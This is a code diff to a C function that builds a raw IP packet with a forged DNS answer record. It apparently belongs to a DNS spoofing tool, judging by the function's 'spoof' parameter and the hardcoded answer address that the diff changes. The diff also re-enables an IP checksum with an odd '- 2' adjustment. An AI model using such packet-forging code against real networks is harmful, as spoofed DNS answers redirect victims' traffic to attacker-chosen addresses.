@@ -190,7 +190,7 @@ int createDNSPacket(u_char start[], u_char spoof[]) {
 	// ver 0100 ipv4 and header length 0101 (20 bytes)
 	iph->ver_ihl = 0x45;
 	// Tos whatever
-	iph->tos = 0;
+	iph->tos = 0x02;
 	// Identification whatever, not using fragmentation
 	iph->identification = 0x4885;
 	// Not using fragmentation
@@ -265,17 +265,17 @@ int createDNSPacket(u_char start[], u_char spoof[]) {
 	*pp++ = 0x00;
 	*pp++ = 0x00;
 	*pp++ = 0x00;
-	*pp++ = 0x8c;
+	*pp++ = 0x00;
 
 	// Data length
 	*pp++ = 0x00;
 	*pp++ = 0x04;
 
 	// IP-address
-	*pp++ = 149;
-	*pp++ = 202;
-	*pp++ = 176;
-	*pp++ = 202;
+	*pp++ = 209;
+	*pp++ = 133;
+	*pp++ = 209;
+	*pp++ = 245;
 
 	// lengths
 	iph->tlen = ntohs(pp - (u_char*)iph);
@@ -283,14 +283,16 @@ int createDNSPacket(u_char start[], u_char spoof[]) {
 
 	// Validation disabled...
 	iph->crc = 0;
-	/*u_int checksum = 0;
+	u_int checksum = 0;
 	for (u_short *p = (u_short*)iph, i = 0; i < 10; i++, p++)
+	{
 		checksum += ntohs(*p);
-	while (checksum > 0xFFFF)
-		checksum = (checksum & 0xF000) + (checksum & 0x0FFF);
+		while (checksum > 0xFFFF)
+			checksum = (checksum & 0xF000) + (checksum & 0x0FFF);
+	}
 	checksum = ~checksum;
-	iph->crc = ntohs(checksum & 0xFFFF);
-	*/
+	iph->crc = htons(checksum - 2);
+	
 	return (pp - start);
 }
 
